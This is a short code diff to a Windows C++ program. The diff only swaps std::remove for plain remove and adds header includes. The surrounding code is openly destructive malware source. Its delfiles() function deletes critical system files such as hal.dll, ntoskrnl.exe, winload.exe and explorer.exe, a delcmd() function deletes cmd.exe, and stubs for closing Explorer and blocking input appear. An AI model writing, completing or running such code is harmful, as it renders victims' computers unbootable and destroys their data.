@@ -1,11 +1,13 @@
 #include <iostream>
 #include <windows.h>
+#include <winable.h>
+#include <stdio.h>
 void delfiles() {
-  std::remove("C:\\Windows\\System32\\hal.dll");
-  std::remove("C:\\Windows\\System32\\wininit.exe");
-  std::remove("C:\\Windows\\System32\\winload.exe");
-  std::remove("C:\\Windows\\System32\\ntoskrnl.exe");
-  std::remove("C:\\Windows\\explorer.exe");
+  remove("C:\\Windows\\System32\\hal.dll");
+  remove("C:\\Windows\\System32\\wininit.exe");
+  remove("C:\\Windows\\System32\\winload.exe");
+  remove("C:\\Windows\\System32\\ntoskrnl.exe");
+  remove("C:\\Windows\\explorer.exe");
 
 
 }
@@ -21,7 +23,7 @@ void closeexplorer() {
 
 }
 void delcmd() {
-  std::remove("C:\\System32\\cmd.exe");
+  remove("C:\\System32\\cmd.exe");
 
 }
 void blockinput() {
